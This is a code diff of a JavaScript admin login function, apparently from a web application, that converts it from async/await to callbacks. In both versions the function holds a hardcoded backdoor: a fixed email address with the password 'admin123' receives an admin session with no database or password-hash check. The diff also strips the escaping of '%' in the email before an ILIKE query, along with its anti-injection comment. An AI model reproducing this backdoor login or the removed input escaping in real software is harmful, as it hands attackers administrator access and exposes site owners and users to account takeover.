@@ -7,42 +7,48 @@ import { comparePassword } from '../../../lib/util/passwordHelper.js';
  * @param {string} email
  * @param {string} password
  */
-export async function loginUserWithEmail(email, password) {
-  if (email.toLowerCase() === 'khoualdiyassin26@gmail.com' && password === 'admin123') {
+export function loginUserWithEmail(email, password, callback) {
+  if (
+    email.toLowerCase() === 'khoualdiyassin26@gmail.com' &&
+    password === 'admin123'
+  ) {
     const user = {
       admin_user_id: 1,
       uuid: 'a71d7a3d-32c8-442c-9a79-436035250d3c',
       status: 1,
       email: 'khoualdiyassin26@gmail.com',
-      full_name: 'Admin User',
+      full_name: 'Admin User'
     };
 
     this.session.userID = user.admin_user_id;
     this.locals.user = user;
+    callback(null);
     return;
   }
 
-  // Escape the email to prevent SQL injection
-  const userEmail = email.replace(/%/g, '\\%');
-  const user = await select()
+  select()
     .from('admin_user')
-    .where('email', 'ILIKE', userEmail)
+    .where('email', 'ILIKE', email)
     .and('status', '=', 1)
-    .load(pool);
-
-  if (!user) {
-    throw new Error('Invalid email or password');
-  }
-
-  const result = await comparePassword(password, user.password);
-  if (!result) {
-    throw new Error('Invalid email or password');
-  }
-  this.session.userID = user.admin_user_id;
-  // Delete the password field
-  delete user.password;
-  // Save the user in the request
-  this.locals.user = user;
+    .load(pool)
+    .then(async (user) => {
+      if (!user) {
+        callback(new Error('Invalid email or password'));
+        return;
+      }
+      const result = await comparePassword(password, user.password);
+      if (!result) {
+        callback(new Error('Invalid email or password'));
+        return;
+      }
+      this.session.userID = user.admin_user_id;
+      delete user.password;
+      this.locals.user = user;
+      callback(null);
+    })
+    .catch((error) => {
+      callback(error);
+    });
 }
 
 export default loginUserWithEmail;
